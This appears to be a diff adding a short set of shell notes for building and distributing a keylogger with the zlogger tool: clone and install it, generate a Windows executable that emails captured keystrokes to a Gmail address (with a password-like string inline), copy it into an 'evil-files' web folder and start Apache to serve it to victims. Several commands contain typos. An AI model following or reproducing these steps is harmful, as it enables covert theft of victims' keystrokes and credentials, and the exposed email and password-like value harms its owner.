@@ -1,0 +1,21 @@
+cd /opt
+git clone https://github.com/zooz/zlogger.git
+ls
+cd zzlogger
+ls
+bash install.sh
+python zlogger.py
+
+cd/opt/zlogger/
+ls
+python zlogger.py --help
+python zlogger.py -i 60 -w -e liveletrevin6@gmail.com -p ashihundu -o keylogger
+
+#copy paste the generate link in browser
+
+ls
+ls dist/
+cp dist/keylogger.exe /var/wwww/html/evil-files/
+service apache2 start
+
+ip in browser
